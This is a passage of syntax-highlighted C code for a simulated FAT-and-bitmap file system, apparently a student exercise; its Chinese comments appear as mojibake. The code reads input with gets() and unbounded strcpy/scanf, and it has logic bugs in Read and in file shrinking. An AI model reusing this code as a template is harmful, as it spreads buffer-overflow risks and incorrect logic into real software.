class="comment">//ä¸€æ¡é€»è¾‘è®°å½•çš„å¤§å°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLOCKNUM 100      <span class="comment">//ç‰©ç†å—æ•°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROW 7             <span class="comment">//ç¤ºä½å›¾è¡Œæ•°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COL 16            <span class="comment">//ç¤ºä½å›¾åˆ—æ•°</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE 0            <span class="comment">//ç¤ºä½å›¾ä¸­è¡¨ç¤ºç©ºé—²çŠ¶æ€</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USED 1            <span class="comment">//ç¤ºä½å›¾ä¸­è¡¨ç¤ºå·²ç”¨çŠ¶æ€</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> OK = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç›®å½•é¡¹</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listItem</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];  <span class="comment">// æ–‡ä»¶åå­—</span></span><br><span class="line">    <span class="keyword">int</span> nodeId;          <span class="comment">// æ–‡ä»¶å¯¹åº”çš„ç»“ç‚¹ç¼–å·</span></span><br><span class="line">&#125; listItem;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Block</span> &#123;</span></span><br><span class="line">    <span class="comment">// æ¯ä¸€ä¸ªç‰©ç†å—æœ‰ä¸‰å—é€»è¾‘è®°å½•å·</span></span><br><span class="line">    <span class="keyword">char</span> firstLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> secondLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> thirdogical[LOGICALSIZE];</span><br><span class="line">&#125; Block;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> firstBlockId;     <span class="comment">// æ–‡ä»¶ç¬¬ä¸€å—å—å·</span></span><br><span class="line">    <span class="keyword">int</span> lastBlockId;      <span class="comment">// æ–‡ä»¶æœ€åä¸€å—å—å·</span></span><br><span class="line">    <span class="keyword">int</span> usedBlocksNum;    <span class="comment">// æ–‡ä»¶å ç”¨çš„ç›˜å—æ•°</span></span><br><span class="line">    <span class="keyword">time_t</span> createTime;    <span class="comment">// æ–‡ä»¶åˆ›å»ºæ—¶é—´</span></span><br><span class="line">    <span class="keyword">time_t</span> LastEditTime;  <span class="comment">// æ–‡ä»¶ä¸Šæ¬¡ä¿®æ”¹æ—¶é—´</span></span><br><span class="line">    <span class="keyword">int</span> permission;       <span class="comment">// æ–‡ä»¶æƒé™</span></span><br><span class="line">    <span class="keyword">int</span> isDelete;         <span class="comment">// è¯¥èŠ‚ç‚¹æ˜¯å¦è¢«æ ‡è®°â€œå·²åˆ é™¤â€</span></span><br><span class="line">    <span class="keyword">char</span> standby[<span class="number">20</span>];     <span class="comment">// å¤‡ç”¨</span></span><br><span class="line">&#125; Inode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Disk</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> FAT[BLOCKNUM];             <span class="comment">// æœ€å¤šæœ‰BLOCKNUMä¸ªè¡¨é¡¹</span></span><br><span class="line">    <span class="keyword">int</span> bitmap[ROW][COL];          <span class="comment">// ç¤ºä½å›¾</span></span><br><span class="line">    listItem directory[BLOCKNUM];  <span class="comment">// ç›®å½• æœ€å¤šæœ‰BLOCKNUMä¸ªç›®å½•é¡¹</span></span><br><span class="line">    Inode FDI[BLOCKNUM];  <span class="comment">// ç´¢å¼•ç»“ç‚¹é›†åˆ æœ€å¤šæœ‰BLOCKNUMä¸ªèŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">int</span> fileNum;</span><br><span class="line">    Block blocks[BLOCKNUM];  <span class="comment">// æ€»çš„ç‰©ç†ç›˜å—æ•°</span></span><br><span class="line">    <span class="keyword">int</span> freeBlock;           <span class="comment">// ç©ºé—²ç›˜å—æ•°é‡</span></span><br><span class="line">&#125; Disk;</span><br><span class="line">Disk d;</span><br><span class="line"><span class="keyword">int</span> dirLastIndex;  <span class="comment">// æœ€åçš„ç›®å½•é¡¹ä¸‹æ ‡</span></span><br><span class="line"><span class="keyword">int</span> fdiLastIndex;  <span class="comment">// æœ€åçš„ç´¢å¼•ç»“ç‚¹ä¸‹æ ‡</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç”³è¯·æˆåŠŸï¼Œåˆ™è¿”å›ç”³è¯·çš„ç‰©ç†å—å·</span></span><br><span class="line"><span class="comment"> * å¦åˆ™è¿”å›-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getFreeBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (d.freeBlock &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// éšæœºç”³è¯·ä¸€å—ç‰©ç†å— å‡å¦‚å·²ç»è¢«ä½¿ç”¨  åˆ™å¾€åå¯»æ‰¾</span></span><br><span class="line">    srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">int</span> index = rand() % BLOCKNUM;</span><br><span class="line">    <span class="keyword">int</span> r = index / <span class="number">16</span>, c = index % <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (d.bitmap[r][c] == <span class="number">0</span>) &#123;</span><br><span class="line">        d.bitmap[r][c] = <span class="number">1</span>;</span><br><span class="line">        d.freeBlock--;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i, j;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="number">15</span>) &#123;</span><br><span class="line">            i = (r + <span class="number">1</span>) % <span class="number">7</span>;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i = r;</span><br><span class="line">            j = (c + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; <span class="number">7</span>; )</span><br><span class="line">            <span class="keyword">for</span> (; j &lt; <span class="number">16</span>; ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (d.bitmap[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">                    d.bitmap[i][j] = <span class="number">1</span>;</span><br><span class="line">                    d.freeBlock--;</span><br><span class="line">                    <span class="keyword">return</span> (i * <span class="number">16</span> + j);</span><br><span class="line">                &#125;</span><br><span class="line">                j++;</span><br><span class="line">                <span class="keyword">if</span>(j == <span class="number">16</span>)&#123;</span><br><span class="line">                    i = (i + <span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">                    j = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¼å¼åŒ–</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intial</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; i++) d.FAT[i] = EOF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ROW; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COL; j++) d.bitmap[i][j] = FREE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; BLOCKNUM; i++) &#123;</span><br><span class="line">        d.blocks[i].firstLogical[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        d.blocks[i].secondLogical[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">        d.blocks[i].thirdogical[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    d.fileNum = <span class="number">0</span>;</span><br><span class="line">    dirLastIndex = <span class="number">0</span>;</span><br><span class="line">    fdiLastIndex = <span class="number">0</span>;</span><br><span class="line">    d.freeBlock = BLOCKNUM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é”™è¯¯ç ï¼š</span></span><br><span class="line"><span class="comment"> * 2ï¼šæ–‡ä»¶å·²å­˜åœ¨</span></span><br><span class="line"><span class="comment"> * 3ï¼šç£ç›˜ç©ºé—´ä¸è¶³</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Create</span><span class="params">(<span class="keyword">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(d.directory[i].fileName, fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">int</span> blockId = getFreeBlock();</span><br><span class="line">    <span class="keyword">if</span> (blockId == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; fdiLastIndex; i++)</span><br><span class="line">            <span class="keyword">if</span> (d.FDI[i].isDelete) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// å¤„ç†ç´¢å¼•ç»“ç‚¹</span></span><br><span class="line">        d.FDI[i].firstBlockId = d.FDI[i].lastBlockId = blockId;</span><br><span class="line">        <span class="comment">// è·å–å½“å‰æ—¶é—´æˆ³</span></span><br><span class="line">        time(&amp;(d.FDI[i].createTime));</span><br><span class="line">        d.FDI[i].LastEditTime = d.FDI[i].createTime;</span><br><span class="line">        d.FDI[i].permission = <span class="number">444</span>;</span><br><span class="line">        d.FDI[i].usedBlocksNum = <span class="number">1</span>;</span><br><span class="line">        d.FDI[i].isDelete = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dirLastIndex; j++)</span><br><span class="line">            <span class="keyword">if</span> (d.directory[j].nodeId == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// å¤„ç†ç›®å½•é¡¹</span></span><br><span class="line">        <span class="built_in">strcpy</span>(d.directory[j].fileName, fileName);</span><br><span class="line">        d.directory[j].nodeId = i;</span><br><span class="line">        <span class="keyword">if</span> (i == dirLastIndex) dirLastIndex++;</span><br><span class="line">        <span class="keyword">if</span> (j == fdiLastIndex) fdiLastIndex++;</span><br><span class="line">        d.fileNum++;</span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">readReturn</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">char</span> msg[LOGICALSIZE];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¿”å›å€¼ï¼š</span></span><br><span class="line"><span class="comment"> * 1:è¯»å–æ­£å¸¸</span></span><br><span class="line"><span class="comment"> * 2:æ–‡ä»¶ä¸å­˜åœ¨</span></span><br><span class="line"><span class="comment"> * 3:é€»è¾‘è®°å½•å·é”™è¯¯</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct readReturn <span class="title">Read</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">int</span> logical_record_no)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">readReturn</span> <span class="title">r</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filename, d.directory[i].fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= dirLastIndex) &#123;</span><br><span class="line">        r.status = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> BlockId = logical_record_no / <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (BlockId + <span class="number">1</span> &gt; d.FDI[d.directory[i].nodeId].usedBlocksNum) &#123;</span><br><span class="line">        r.status = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> index = d.FDI[i].firstBlockId;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; BlockId; j++) index = d.FAT[index];</span><br><span class="line">    <span class="keyword">switch</span> (logical_record_no % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(r.msg, d.blocks[index].firstLogical);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(r.msg, d.blocks[index].secondLogical);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(r.msg, d.blocks[index].thirdogical);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    r.status = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é”™è¯¯ç ï¼š</span></span><br><span class="line"><span class="comment"> * 2ï¼šæ–‡ä»¶ä¸å­˜åœ¨</span></span><br><span class="line"><span class="comment"> * 3ï¼šé€»è¾‘è®°å½•å·é”™è¯¯</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Write</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="built_in">text</span>, <span class="keyword">int</span> logical_record_no)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(filename, d.directory[i].fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= dirLastIndex) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (logical_record_no &lt; <span class="number">0</span> ||</span><br><span class="line">        logical_record_no &gt;= d.FDI[i].usedBlocksNum * <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="comment">// é€šè¿‡ firstBlockId åœ¨ FAT ä¸­å¯»æ‰¾æ­£ç¡®çš„ä½ç½®å†™å…¥</span></span><br><span class="line">    <span class="keyword">int</span> index = d.FDI[i].firstBlockId, blockId = logical_record_no / <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; blockId; j++) index = d.FAT[index];</span><br><span class="line">    <span class="keyword">switch</span> (logical_record_no % <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(d.blocks[index].firstLogical, <span class="built_in">text</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(d.blocks[index].secondLogical, <span class="built_in">text</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">strcpy</span>(d.blocks[index].thirdogical, <span class="built_in">text</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è·å–å½“å‰æ—¶é—´æˆ³</span></span><br><span class="line">    time(&amp;(d.FDI[i].LastEditTime));</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ–°æ–‡ä»¶åï¼š\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">    <span class="keyword">int</span> status = Create(fileName);</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œè¯·å…ˆåˆ é™¤æ—§æ–‡ä»¶å†åˆ›å»ºè¯¥æ–‡ä»¶ã€‚\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (status == <span class="number">3</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ç£ç›˜ç©ºé—´ä¸è¶³ï¼æ— æ³•åˆ›å»ºæ–°æ–‡ä»¶ã€‚\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"åˆ›å»ºæˆåŠŸ!\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryRead</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span> logical_record_no;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æƒ³è¦è¯»å–çš„æ–‡ä»¶åï¼š\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æƒ³è¦è¯»å–çš„é€»è¾‘è®°å½•å·ï¼ˆç¼–å·ä»é›¶å¼€å§‹ï¼‰ï¼š\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;logical_record_no);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">readReturn</span> <span class="title">r</span> = <span class="title">Read</span>(<span class="title">fileName</span>, <span class="title">logical_record_no</span>);</span></span><br><span class="line">    <span class="keyword">if</span> (r.status == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼è¯·é‡æ–°è¾“å…¥æ–‡ä»¶åã€‚\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r.status == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯¥æ–‡ä»¶æ²¡æœ‰è¯¥é€»è¾‘è®°å½•ï¼Œè¯·è¾“å…¥æ­£ç¡®çš„é€»è¾‘è®°å½•å·ã€‚\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯»å–åˆ°çš„å†…å®¹æ˜¯\n%s\n"</span>, r.msg);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryWrite</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>], <span class="built_in">text</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> logical_record_no, newBlockSize;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exit</span> = <span class="number">0</span>, choice;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">exit</span>) &#123;</span><br><span class="line">        system(<span class="string">"cls"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.å‘æ–‡ä»¶ä¸­å†™å…¥æ•°æ®\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.ä¿®æ”¹æ–‡ä»¶å¤§å°\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0.è¿”å›\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ‚¨çš„é€‰æ‹©ï¼š\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æƒ³è¦å†™å…¥çš„æ–‡ä»¶åï¼š\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æƒ³è¦å†™å…¥çš„é€»è¾‘è®°å½•å·ï¼ˆç¼–å·ä»é›¶å¼€å§‹ï¼‰ï¼š\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;logical_record_no);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ‚¨æƒ³è¦å†™å…¥çš„ä¿¡æ¯ï¼ˆä¸€æ¬¡æœ€å¤šå†™å…¥%dä¸ªå­—ç¬¦ï¼‰\n"</span>,</span><br><span class="line">                       LOGICALSIZE);</span><br><span class="line">                getchar();</span><br><span class="line">                gets(<span class="built_in">text</span>);</span><br><span class="line">                <span class="keyword">int</span> status = Write(fileName, <span class="built_in">text</span>, logical_record_no);</span><br><span class="line">                <span class="keyword">if</span> (status == <span class="number">2</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¯·è¾“å…¥æ­£ç¡®çš„æ–‡ä»¶åï¼\n"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == <span class="number">3</span>) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(</span><br><span class="line">                        <span class="string">"æ‚¨è¾“å…¥çš„é€»è¾‘è®°å½•å·è¿‡å¤§æˆ–è€…æ˜¯è´Ÿæ•°ï¼Œæ‚¨å¯ä»¥é€šè¿‡å¢åŠ æ–‡ä»¶å¤§"</span></span><br><span class="line">                        <span class="string">"å°ä½¿å¾—æ–‡ä»¶æ‹¥æœ‰è¯¥é€»è¾‘è®°å½•å·\n"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"å†™å…¥æˆåŠŸï¼\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"è¯·è¾“å…¥æ‚¨æƒ³è¦ä¿®æ”¹çš„æ–‡ä»¶åï¼š\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">                <span class="built_in">printf</span>(</span><br><span class="line">                    <span class="string">"è¯·è¾“å…¥è¯¥æ–‡ä»¶æ–°å¤§å°ï¼ˆè‹¥æ–°çš„å¤§å°å°äºåŸæ¥çš„å¤§å°ï¼Œåˆ™åªä¿ç•™æ–°çš„"</span></span><br><span class="line">                    <span class="string">"å¤§å°çš„æ•°æ®ï¼Œæ–°å¤§å°åº”è¯¥æ˜¯ä¸€ä¸ªå¤§äºé›¶çš„æ•°å­—ï¼Œå•ä½ï¼šå—ï¼‰ï¼š\n"</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;newBlockSize);</span><br><span class="line">                <span class="comment">// ç´¢å¼•ç»“ç‚¹æ‰€åœ¨ä¸‹æ ‡</span></span><br><span class="line">                <span class="keyword">int</span> i;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fileName, d.directory[i].fileName) &amp;&amp;</span><br><span class="line">                        d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> (i &gt;= dirLastIndex) &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¯·è¾“å…¥æ­£ç¡®çš„æ–‡ä»¶åï¼\n"</span>);</span><br><span class="line">                    system(<span class="string">"pause"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newBlockSize &gt; d.FDI[i].usedBlocksNum) &#123;</span><br><span class="line">                    <span class="comment">// å¢åŠ æ–‡ä»¶å¤§å°</span></span><br><span class="line">                    <span class="keyword">int</span> need = newBlockSize - d.FDI[i].usedBlocksNum, blockId;</span><br><span class="line">                    <span class="keyword">while</span> (need) &#123;</span><br><span class="line">                        blockId = getFreeBlock();</span><br><span class="line">                        <span class="keyword">if</span> (blockId == <span class="number">-1</span>) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(</span><br><span class="line">                                <span class="string">"ç£ç›˜ç©ºé—´ä¸è¶³ï¼åªæˆåŠŸç”³è¯·äº† %d "</span></span><br><span class="line">                                <span class="string">"ä¸ªç‰©ç†å—ï¼Œç”³è¯·å¤±è´¥ %d ä¸ª\n"</span>,</span><br><span class="line">                                newBlockSize - need, need);</span><br><span class="line">                            system(<span class="string">"pause"</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        need--;</span><br><span class="line">                        d.FAT[d.FDI[i].lastBlockId] = blockId;</span><br><span class="line">                        d.FDI[i].lastBlockId = blockId;</span><br><span class="line">                        d.FDI[i].usedBlocksNum++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    time(&amp;(d.FDI[i].LastEditTime));</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"ä¿®æ”¹æˆåŠŸï¼\n"</span>);</span><br><span class="line">                    system(<span class="string">"pause"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newBlockSize &lt; d.FDI[i].usedBlocksNum) &#123;</span><br><span class="line">                    <span class="comment">// å‡å°æ–‡ä»¶</span></span><br><span class="line">                    <span class="keyword">int</span> index = d.FAT[d.FDI[i].firstBlockId], count = <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span> (count &lt; newBlockSize) &#123;</span><br><span class="line">                        index = d.FAT[index];</span><br><span class="line">                        count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// å›æ”¶åé¢çš„ç£ç›˜ç©ºé—´</span></span><br><span class="line">                    <span class="keyword">while</span> (newBlockSize - count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">int</span> old = d.FAT[index];</span><br><span class="line">                        index = d.FAT[index];</span><br><span class="line">                        d.FAT[old] = EOF;</span><br><span class="line">                        count++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    time(&amp;(d.FDI[i].LastEditTime));</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"ä¿®æ”¹æˆåŠŸï¼\n"</span>);</span><br><span class="line">                    system(<span class="string">"pause"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span 